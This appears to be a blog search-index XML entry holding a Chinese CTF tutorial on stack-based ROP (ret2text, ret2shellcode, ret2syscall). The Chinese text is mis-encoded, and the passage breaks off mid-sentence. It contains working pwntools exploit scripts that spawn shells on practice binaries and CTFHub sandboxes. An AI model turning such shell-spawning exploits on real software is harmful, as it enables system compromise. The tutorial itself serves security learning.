<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>çœŸçš„å¾ˆèœèœçš„ROP</title>
    <link href="/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>æ ˆä¸Šçš„ç®€å•å°ç©æ„ä»¬</p><span id="more"></span><hr><p>éšç€ NX ä¿æŠ¤çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœã€‚æ”»å‡»è€…ä»¬ä¹Ÿæå‡ºæ¥ç›¸åº”çš„æ–¹æ³•æ¥ç»•è¿‡ä¿æŠ¤ï¼Œç›®å‰ä¸»è¦çš„æ˜¯ ROP(Return Oriented Programmingï¼Œé¢å‘è¿”å›ç¼–ç¨‹ï¼‰ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨<strong>æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ( gadgets )æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</strong></p><p>æ‰€è°“ gadgets å°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p><p><strong>å®æ–½ROPçš„æ¡ä»¶</strong></p><ul><li>ç¨‹åºå­˜åœ¨æ ˆæº¢å‡ºï¼Œä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€</li><li>å¯ä»¥æ‰¾åˆ°æ»¡è¶³ç¨‹åºçš„ gadgets ä»¥åŠç›¸åº”çš„ gadgets çš„åœ°å€</li></ul><blockquote><p>éƒ½æ˜¯copyæ¥çš„ï¼‰çœ‹åˆ°æœ‰çš„äººè¯´è¿™ä¸ªå«â€œé¢å‘è¿”å›åœ°å€â€ç¼–ç¨‹å“ˆå“ˆã€‚</p></blockquote><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç (.text)ï¼Œæ¯”å¦‚<code>system(&quot;/bin/sh&quot;)</code>æˆ–è€…<code>system(&quot;cat flag&quot;)</code>ã€‚æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æŠŠè¿™äº›ä»£ç æ®µçš„è°ƒç”¨åœ°å€è¦†ç›–åˆ°è¿”å›åœ°å€ä¸Šã€‚</p><p>æˆ‘ä»¬åœ¨æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„å·²æœ‰ä»£ç ï¼Œè¿™æ˜¯æˆ‘ä»¬éœ€è¦çŸ¥é“å¯¹åº”è¿”å›çš„ä»£ç çš„ä½ç½®ã€‚ç¨‹åºå¦‚æœå¼€å¯äº†æŸäº›ä¿æŠ¤ï¼Œæˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•å»ç»•è¿‡å®ƒã€‚</p><h4 id="ğŸŒ°-1"><a href="#ğŸŒ°-1" class="headerlink" title="ğŸŒ°_1:"></a>ğŸŒ°_1:</h4><p>ç‚¹å‡»ä¸‹è½½: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-14-08.png"></p><p>ä½¿ç”¨idaåç¼–è¯‘mainå‡½æ•°ï¼Œå‘ç°gets()è¯­å¥ï¼Œå¯ä»¥åˆ©ç”¨æ ˆæº¢å‡º</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-30-17.png"></p><p>è€Œåæˆ‘ä»¬åœ¨secureä¸­å¯ä»¥æ‰¾åˆ°è°ƒç”¨<code>system(&#39;&quot;/bin/sh&quot;)</code>çš„ä»£ç ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶ç¨‹åºè¿”å›åˆ°è¿™ä¸ªæŒ‡ä»¤ï¼Œå°±å¯ä»¥è·å¾—ç³»ç»Ÿçš„shell</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-31-37.png"></p><p>æŸ¥çœ‹ä»£ç åœ°å€ä¸º0x0804863Aï¼Œæ¥ä¸‹æ¥æ„é€ playloadã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="ğŸŒ°-2"><a href="#ğŸŒ°-2" class="headerlink" title="ğŸŒ°_2:"></a>ğŸŒ°_2:</h4><p>æ¥è‡ªCTFHUBçš„ret2text ï¼Œæˆ‘ä¸çŸ¥é“æ€ä¹ˆå¤åˆ¶é¢˜ç›®é“¾æ¥ï¼Œè‡ªå·±ç‚¹è¿›å»æ‰¾å­<a href="https://www.ctfhub.com/#/skilltree">CTFHub</a></p><p>æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-47-25.png"></p><p>æ‹–è¿›32ä½IDAåç¼–è¯‘å‘ç°mainå‡½æ•°å­˜åœ¨getsæ ˆæº¢å‡ºæ¼æ´</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-51-25.png"></p><p>shift+F12æ‰“å¼€å­—ç¬¦ä¸²çª—å£å‘ç°&#x2F;bin&#x2F;shè¯­å¥</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-56-54.png"></p><p>å»åˆ°å¯¹åº”çš„è¯­å¥éƒ¨åˆ†å¯ä»¥å‘ç°è¯¥ç¨‹åºå°†&#x2F;bin&#x2F;shæ”¾åˆ°äº†rdiåï¼Œå¹¶ä¸”è°ƒç”¨äº†sysytem</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-00-09.png"></p><blockquote><p>64ä½ç³»ç»Ÿä¸­rdiï¼Œrsiï¼Œrdxï¼Œrcxï¼Œr8ï¼Œr9ä½œä¸ºè°ƒç”¨å‡½æ•°çš„å‰6ä¸ªå‚æ•°ï¼Œå¦‚æœå‚æ•°å¤šäº6ä¸ªï¼Œå…¶ä½™å‚æ•°æ”¾å…¥æ ˆä¸­ã€‚ä¸æ­¤å¯¹æ¯”ï¼Œ32ä½ç³»ç»Ÿä¸­ç”±äºå¯„å­˜å™¨æœ‰é™ï¼Œè°ƒç”¨å‡½æ•°æ—¶å‚æ•°éƒ½æ”¾å…¥æ ˆä¸­</p></blockquote><p>æ‰¾ä¸€ä¸ªå˜é‡åŒå‡»å¯ä»¥çœ‹åˆ°å„ä¸ªå˜é‡å¯¹åº”çš„è™šæ‹Ÿå†…å­˜åœ°å€ï¼Œæ„é€ playloadå°±å¯ä»¥å…ˆç”¨0x70ä¸ªè‡ªèŠ‚å¡«æ»¡så˜é‡ï¼Œå†ç”¨8ä¸ªå­—èŠ‚å¡«æ»¡rï¼Œæœ€ååŠ ä¸Š&#x2F;bin&#x2F;shçš„åœ°å€ã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-06-55.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-e20ddfc12b209019.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">34749</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span> + <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x4007B8</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;Welcome to CTFHub ret2text.Input someting:\n&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>â€˜+4â€™ æ˜¯å› ä¸º32ä½ç¨‹åºè¦è¦†ç›–çš„ebpæ˜¯å››ä¸ªå­—èŠ‚ï¼Œ64ä½ç¨‹åºéœ€è¦è¦†ç›–å…«å­—èŠ‚çš„rbp</p></blockquote><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>å°±æ˜¯ç¯¡æ”¹æ ˆå¸§ä¸Šçš„è¿”å›åœ°å€ä¸ºæ”»å‡»è€…æ‰‹åŠ¨ä¼ å…¥çš„shellcodeæ‰€åœ¨ç¼“å†²åŒºåœ°å€ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨pwntoolsä¸­çš„shellcraft.sh()ç¼–å†™shellcodeã€‚</p><p>åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œè¦æƒ³æ‰§è¡Œ shellcodeï¼Œéœ€è¦å¯¹åº”çš„ binary åœ¨è¿è¡Œæ—¶ï¼Œshellcode æ‰€åœ¨çš„åŒºåŸŸå…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</p><h4 id="ğŸŒ°-1-1"><a href="#ğŸŒ°-1-1" class="headerlink" title="ğŸŒ°_1:"></a>ğŸŒ°_1:</h4><p>ç‚¹å‡»ä¸‹è½½é¢˜ç›®: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-40-56.png"></p><p>è¿›å…¥mainå‡½æ•°åç¼–è¯‘ä¸€ä¸‹ï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-46-07.png"></p><p>å‘ç°getså’Œstrncpyå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œä½†ç³»ç»Ÿæ²¡æœ‰ç°æˆçš„â€˜bin&#x2F;shâ€™æŒ‡ä»¤ç»™æˆ‘ä»¬ç”¨ã€‚æˆ‘ä»¬è¦è‡ªå·±å†™ğŸ¥²</p><p>é‚£æ€ä¹ˆå†™å‘¢ï¼Ÿè¿™æ—¶å°±è¦è¯·å‡ºæˆ‘ä»¬çš„å¾—åŠ›åŠ©æ‰‹pwntoolsï¼Œåœ¨pwntoolsä¸‹å¯ä»¥è‡ªåŠ¨ç”Ÿæˆshellcodeè„šæœ¬ã€‚</p><p>getsè·å¾—è¾“å…¥çš„så˜é‡ï¼Œå¹¶å°†å…¶å¤åˆ¶åˆ°buf2å¤„ã€‚åŒå‡»buf2å¯ä»¥è·³è½¬åˆ°å…¶æ‰€åœ¨ä½ç½®ï¼Œæˆ‘ä»¬å‘ç°buf2åœ¨.bssæ®µï¼Œæ‰€åœ¨æ®µåœ°å€ä¸º0x0804a080</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-49-27.png"></p><p>è°ƒè¯•ä¸‹ç¨‹åºï¼Œçœ‹çœ‹è¿™ä¸€ä¸ª bss æ®µæ˜¯å¦å¯æ‰§è¡Œï¼Œæ˜¾ç¤ºrwxpå°±æ˜¯å¯ä»¥ã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_11-02-42.png"></p><p>æœ‰æƒé™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†shellcodeé€šè¿‡strncpyå‡½æ•°æ”¾è¿›buf2è¿™ä¸ªåŒºåŸŸï¼Œåœ¨è§¦å‘æº¢å‡ºåå°†è¿”å›åœ°å€æŒ‡å‘buf2è¿™é‡Œå³å¯æ‹¿åˆ°shellã€‚</p><p>ç¡®å®šè¦è¦†ç›–çš„ return address çš„åç§»é‡ç›¸å¯¹äºæ ˆé¡¶ä¸º 112 ä¸ªå­—èŠ‚ã€‚</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="ğŸŒ°-2-1"><a href="#ğŸŒ°-2-1" class="headerlink" title="ğŸŒ°_2:"></a>ğŸŒ°_2:</h4><p>è¿˜æ˜¯CTFHubçš„é¢˜ç›®ã€‚æ”¾è¿›ubuntuæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-00-41.png"></p><p>NX disabledzï¼Œå³å°†shellcodeæ”¾åœ¨æ•°æ®æ®µï¼Œå³å¯æ‰§è¡Œ</p><p>å‡ºç°äº†ä¸€ä¸ªæ–°çš„å˜é‡RWXï¼</p><p>ç”¨IDAåç¼–è¯‘é¢˜ç›®mainå‡½æ•°å‘ç°æ ˆæº¢å‡ºæ¼æ´</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-03-42.png"></p><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“bufç›¸å¯¹äºebpçš„åç§»é‡æ˜¯0x10ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¡«å……(0x10+8)çš„æ•°æ®ã€‚</p><p>åŒå‡»bufæŸ¥çœ‹ç¨‹åºä¸­çš„å˜é‡ä¿¡æ¯</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-14_20-33-36.png"></p><p>rå³ä¸ºè¿”å›åœ°å€ï¼Œæœ‰0x8çš„åç§»é‡ï¼Œæ‰€ä»¥æ€»å…±éœ€è¦å¡«å……çš„æ•°æ®é•¿åº¦æ˜¯ (0x10+0x8+0x8)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-a0bc34814de46f67.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">37477</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;[&#x27;</span>)<br>buf_address = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;]&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(buf_address).upper())<br>shellcode_address = buf_address+<span class="hljs-number">0x20</span> <span class="hljs-comment"># bufä¸rbpçš„è·ç¦»0x10 + rbpçš„å®½åº¦0x8 + è¿”å›åœ°å€çš„é•¿åº¦0x8</span><br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(shellcode_address).upper())<br>shellcode = asm(shellcraft.sh())<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span> + <span class="hljs-number">4</span>) + p64(shellcode_address) + shellcode<br>io.recv()<br>io.sendline(payload)<br>io.interactive()     <br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¹Ÿå¤ªæ·±å¥¥äº†æ²¡ææ‡‚ï¼Œæœ‰ç¼˜å†è¯´</p></blockquote><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>ret2syscallå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œä»è€Œè·å–shellã€‚å‰ææ˜¯ç¨‹åºéœ€è¦æœ‰int 0x80è¿™æ ·çš„ç³»ç»Ÿè°ƒç”¨çš„gadget.</p><p>åœ¨ret2shellcodeçš„æƒ…å¢ƒä¸‹ï¼Œå¦‚æœå¼€å¯äº†NXï¼Œé‚£æˆ‘ä»¬å†™åˆ°æ ˆä¸­çš„shellcodeå°±ä¼šè¢«CPUæŠ¥é”™è€Œä¸å¯æ‰§è¡Œã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ret2syscallçš„æ–¹æ³•ã€‚</p><p>ret2syscallå°±æ˜¯æŒ‡é€šè¿‡æ‰‹æœºå¸¦æœ‰retæŒ‡ä»¤çš„æŒ‡ä»¤ç‰‡æ®µæ‹¼æ¥æˆæˆ‘ä»¬éœ€è¦çš„shellcodeã€‚</p><blockquote><p>ret æŒ‡ä»¤å¯ä»¥ç†è§£ä¸ºå–æ ˆé¡¶çš„æ•°æ®ä½œä¸ºä¸‹æ¬¡è·³è½¬çš„ä½ç½®ï¼Œå³ eip&#x3D;[esp]  esp&#x3D;[esp+4]</p><p>æˆ–è€…ç†è§£ä¸º pop eipï¼Œjmp   </p><p>å–æ ˆé¡¶æ•°æ®ä½œä¸ºä¸‹æ¬¡è·³è½¬çš„ä½ç½®ï¼Œç„¶åè·³è½¬;</p><p>åŒç†callä¹Ÿå¯ä»¥ç†è§£ä¸º push rip, jmp  </p><p>å°†callæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å‹å…¥æ ˆï¼Œç„¶åè·³è½¬</p></blockquote><h4 id="ğŸŒ°"><a href="#ğŸŒ°" class="headerlink" title="ğŸŒ°:"></a>ğŸŒ°:</h4><p> bamboofox ä¸­çš„ ret2syscall </p><p>é¦–å…ˆæ£€æµ‹ç¨‹åºå¼€å¯çš„ä¿æŠ¤ï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-47-19.png"></p><p>æŸ¥çœ‹å…¶æºç å¯»æ‰¾åˆ©ç”¨ç‚¹ï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-48-31.png"></p><p>main å‡½æ•°é‡Œæœ‰ gets å¯ä»¥å®ç°æ ˆæº¢å‡ºï¼Œè®¡ç®—åç§»é‡ä¸º112ã€‚</p><p>æ¥ä¸‹æ¥è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ„é€ ï¼Œåˆ©ç”¨ROPgadgetæŸ¥æ‰¾å¯¹åº”çš„gadgetï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-23-31.png"></p><p>é€‰æ‹©0x080bb196çš„è¿™æ®µ</p><p>åŒæ ·ï¼Œæ‰¾åˆ°å…¶ä»–çš„gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-26-17.png"></p><p>è¿™é‡Œå¯ä»¥åŒæ—¶æ§åˆ¶ä¸‰ä¸ªå¯„å­˜å™¨ï¼Œæˆ‘ä»¬é€‰å®ƒ</p><p>é€‰å¥½æ‰€æœ‰çš„gadgetså°±æ‹¼æ¥èµ·æ¥æ„é€ payloadå°±å¥½å–½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/OMFuQ4/rop&#x27;</span>)  //è¿™æ–‡ä»¶æˆ‘ç›´æ¥æ‹–è¿›å»çš„æ–‡ä»¶åœ°å€å¥½é•¿<br><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806eb90</span><br>binsh = <span class="hljs-number">0x080be408</span><br>pop_eax = <span class="hljs-number">0x080bb196</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, pop_edx_ecx_ebx, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh,pop_eax, <span class="hljs-number">0xb</span>, int_0x80])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="å…³äºlinuxç³»ç»Ÿè°ƒç”¨çš„å®ç°"><a href="#å…³äºlinuxç³»ç»Ÿè°ƒç”¨çš„å®ç°" class="headerlink" title="å…³äºlinuxç³»ç»Ÿè°ƒç”¨çš„å®ç°"></a>å…³äºlinuxç³»ç»Ÿè°ƒç”¨çš„å®ç°</h4><h5 id="ç³»ç»Ÿè°ƒç”¨çš„æ­¥éª¤"><a href="#ç³»ç»Ÿè°ƒç”¨çš„æ­¥éª¤" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨çš„æ­¥éª¤"></a>ç³»ç»Ÿè°ƒç”¨çš„æ­¥éª¤</h5><p>Linuxçš„ç³»ç»Ÿè°ƒç”¨éœ€è¦é€šè¿‡ int 80 å®ç°ï¼Œç”¨ç³»ç»Ÿè°ƒç”¨å·æ¥åŒºåˆ†å…¥å£å‡½æ•°ã€‚æ“ä½œç³»ç»Ÿå®ç°è°ƒç”¨çš„åŸºæœ¬è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>åº”ç”¨ç¨‹åºè°ƒç”¨åº“å‡½æ•°</li><li>APIå°†ç³»ç»Ÿè°ƒç”¨å·å­˜å…¥EAXï¼Œç„¶åé€šè¿‡ä¸­æ–­è°ƒç”¨æ—¶ç³»ç»Ÿè¿›å…¥å†…æ ¸æ€</li><li>å†…æ ¸ä¸­çš„ä¸­æ–­å¤„ç†å‡½æ•°æ ¹æ®ç³»ç»Ÿè°ƒç”¨å·ï¼Œè°ƒç”¨åˆ°å¯¹åº”çš„å†…æ ¸å‡½æ•°ï¼ˆç³»ç»Ÿè°ƒç”¨ï¼‰</li><li>ç³»ç»Ÿè°ƒç”¨å®Œæˆç›¸åº”çš„åŠŸèƒ½ï¼Œå°†è¿”å›å€¼å­˜å…¥EAXï¼Œè¿”å›åˆ°ä¸­æ–­å¤„ç†å‡½æ•°</li><li>ä¸­æ–­å¤„ç†å‡½æ•°è¿”å›åˆ°API</li><li>APIå°†EAXè¿”å›ç»™åº”ç”¨ç¨‹åº</li></ul><blockquote><p>ç³»ç»Ÿè°ƒç”¨å·ï¼š</p><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªç³»ç»Ÿè°ƒç”¨éƒ½è¢«èµ‹äºˆä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å·ã€‚ç³»ç»Ÿè°ƒç”¨å·ä¸€æ—¦åˆ†é…å°±ä¸èƒ½å†æœ‰ä»»ä½•å˜æ›´ï¼Œå¦åˆ™ç¼–è¯‘å¥½çš„åº”ç”¨ç¨‹åºå°±ä¼šå´©æºƒï¼›æ­¤å¤–ï¼Œå¦‚æœä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¢«åˆ é™¤ï¼Œå®ƒæ‰€å ç”¨çš„ç³»ç»Ÿè°ƒç”¨å·ä¹Ÿä¸å…è®¸è¢«å›æ”¶åˆ©ç”¨ã€‚è¿™æ ·ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨å·å°±å¯ä»¥å…³è”ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>æ¯”å¦‚32ä½ä¸‹è°ƒç”¨ execve(â€œ&#x2F;bin&#x2F;shâ€,NULL,NULL) ï¼ŒLinuxç³»ç»Ÿè°ƒç”¨é€šè¿‡int 0x80æŒ‡ä»¤å¼€å§‹ç³»ç»Ÿè°ƒç”¨ï¼Œexceveå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯0xb</p></blockquote><h5 id="ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š"><a href="#ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š" class="headerlink" title="ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š"></a>ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š</h5><p>å‡½æ•°<code>execve(&quot;/bin/sh&quot;,null,null)</code></p><p>å…¶å‡½æ•°è°ƒç”¨è¿‡ç¨‹åº”è¯¥æ˜¯ï¼š</p><ul><li>ç³»ç»Ÿè°ƒç”¨å·å­˜å…¥EAXï¼Œå³eaxåº”è¯¥æ˜¯0xb</li><li>ä¾æ¬¡ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œå³ebxæŒ‡å‘&#x2F;bin&#x2F;shçš„åœ°å€æˆ–è€…shçš„åœ°å€ï¼›ecxä¸º0ï¼›edxä¸º0</li></ul><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“ç³»ç»Ÿåœ¨è°ƒç”¨æ—¶ä¼šç”¨åˆ°eaxï¼Œebxï¼Œecxï¼Œedxå››ä¸ªå¯„å­˜å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†ä»¥ä¸Šçš„å†…å®¹å†™ä¸º<code>int 0x80(eax,ebx,ecx,edx)</code>ã€‚åªè¦æŠŠå¯¹åº”çš„å‚æ•°æ”¾åˆ°ç›¸åº”çš„å¯„å­˜å™¨ä¸­ï¼Œå†æ‰§è¡Œint 0x80å°±å¯ä»¥æ‰§è¡Œç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>é‚£è¯¥æ€ä¹ˆæ§åˆ¶å‘¢ï¼ŸğŸ¤¨ <del>æŠŠåˆ€æ¶åœ¨å¯„å­˜å™¨è„–å­ä¸Š</del></p><p>æˆ‘ä»¬ä»¬å¯ä»¥ä½¿ç”¨popå’ŒretæŒ‡ä»¤ç»„åˆæ¥æ§åˆ¶å¯„å­˜å™¨çš„å€¼ä»¥åŠæ‰§è¡Œæ–¹å‘ã€‚</p><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><p>ROPgadgetå’Œropperï¼Œä¸¤ä¸ªéƒ½å¯å¯ä»¥æ‰¾ï¼Œç›®æ 